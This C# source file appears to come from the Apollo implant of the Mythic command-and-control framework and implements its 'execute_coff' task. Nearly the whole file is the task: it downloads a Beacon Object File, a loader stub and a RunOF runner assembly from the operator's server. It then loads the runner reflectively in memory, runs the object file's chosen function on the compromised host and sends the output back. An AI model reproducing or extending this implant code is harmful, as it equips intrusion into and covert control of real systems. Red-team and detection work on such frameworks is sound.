#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_COFF
#endif

#if EXECUTE_COFF

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.Serialization;


namespace Tasks
{
    public class execute_coff : Tasking
    {
        [DataContract]
        internal struct CoffParameters
        {
            [DataMember(Name = "coff_name")]
            public string CoffName;
            [DataMember(Name = "function_name")]
            public string FunctionName;
            [DataMember(Name = "timeout")]
            public string timeout;
            [DataMember(Name = "coff_arguments")]
            public List<string[]> CoffArguments;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "runof_id")]
            public string RunOFId;
        }

        public execute_coff(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        public override void Start()
        {
            MythicTaskResponse resp;

            try
            {
                CoffParameters parameters = _jsonSerializer.Deserialize<CoffParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.CoffName) ||  string.IsNullOrEmpty(parameters.FunctionName) || string.IsNullOrEmpty(parameters.timeout))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    _agent.GetFileManager().GetFileFromStore(parameters.RunOFId, out byte[] bofRunnerAsm);
                    if (bofRunnerAsm is null || bofRunnerAsm.Length == 0)
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.RunOFId, out bofRunnerAsm))
                        {
                            _agent.GetFileManager().AddFileToStore(parameters.RunOFId, bofRunnerAsm);
                        }
                    }
                    
                    if (_agent.GetFileManager().GetFileFromStore(parameters.CoffName, out byte[] coffBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] coffPic))
                        {
                            string[] args;

                            if (parameters.CoffArguments != null)
                            {
                                string arguments = "";
                                foreach (string[] argumentArray in parameters.CoffArguments)
                                {
                                    if (arguments != "")
                                    {
                                        arguments += " ";
                                    }
                                    string key = argumentArray[0];
                                    string value = argumentArray[1];
                                    switch (key)
                                    {
                                        case "int16":
                                            arguments += "-s:" + value;
                                            break;
                                        case "int32":
                                            arguments += "-i:" + value;
                                            break;
                                        case "string":
                                            arguments += "-z:" + value;
                                            break;
                                        case "wchar":
                                            arguments += "-Z:" + value;
                                            break;
                                        case "base64":
                                            arguments += "-b:" + value;
                                            break;
                                        default:
                                            break;

                                    }
                                }
                                string[] CoffArguments = arguments.Split(' ');

                                args = new string[CoffArguments.Length + 4];
                                args[0] = "-a";
                                args[1] = Convert.ToBase64String(coffPic);
                                args[2] = "-e";
                                args[3] = parameters.FunctionName;

                                Array.Copy(CoffArguments, 0, args, 4, CoffArguments.Length);
                            }
                            else
                            {
                                args = new string[] { "-a", Convert.ToBase64String(coffPic), "-e", parameters.FunctionName };
                            }

                           
                            //load assembly
                            var asm = Assembly.Load(bofRunnerAsm);
                            //use reflection to call the Program class's Main method as the entry point is not defined
                            var programEntryType = asm.GetType("RunOF.Program");
                            var programEntryMethod = programEntryType.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);
                            //get the output
                            var result = programEntryMethod.Invoke(null, new object[] { args });
                            //create a response with the output
                            resp = CreateTaskResponse(result, true);
                        }
                        else
                        {
                            resp = CreateTaskResponse($"Failed to run coff", true, "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Failed to download coff loader stub (with id: {parameters.LoaderStubId})",
                            true,
                            "error");
                    }
                }
            }

            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"Exception: {ex.Message}");
                DebugHelp.DebugWriteLine($"Exception Location: {ex.StackTrace}");
                resp = CreateTaskResponse($"Exception: {ex.Message} \n Location: {ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif